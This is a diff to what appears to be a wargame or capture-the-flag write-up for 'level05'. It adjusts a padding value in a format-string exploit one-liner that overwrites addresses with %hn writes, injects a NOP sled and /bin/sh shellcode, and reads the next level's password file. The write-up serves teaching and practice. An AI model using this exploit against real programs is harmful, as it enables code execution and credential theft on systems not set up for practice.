@@ -30,6 +30,6 @@ Then we use the dummy argument to pad a second parameter in order to write `0xff
 We also need to add `0x00` to the end of our format string so that the program won't modify the value of the shellcode and we offset it by 3 bytes to align it.
 
 ```bash
-(python -c "print('\xe0\x97\x04\x08' + '\xef\xbe\xad\xde' + '\xe2\x97\x04\x08' + '%x'*8 + '%54962x' + '%hn' + '%10531x' + '%hn' + '\x00' + '\x90' * 3 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')"; echo "cat /home/users/level06/.pass") | ./level05
+(python -c "print('\xe0\x97\x04\x08' + '\xef\xbe\xad\xde' + '\xe2\x97\x04\x08' + '%x'*8 + '%54941x' + '%hn' + '%10531x' + '%hn' + '\x00' + '\x90' * 3 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')"; echo "cat /home/users/level06/.pass") | ./level05 
 ```
  
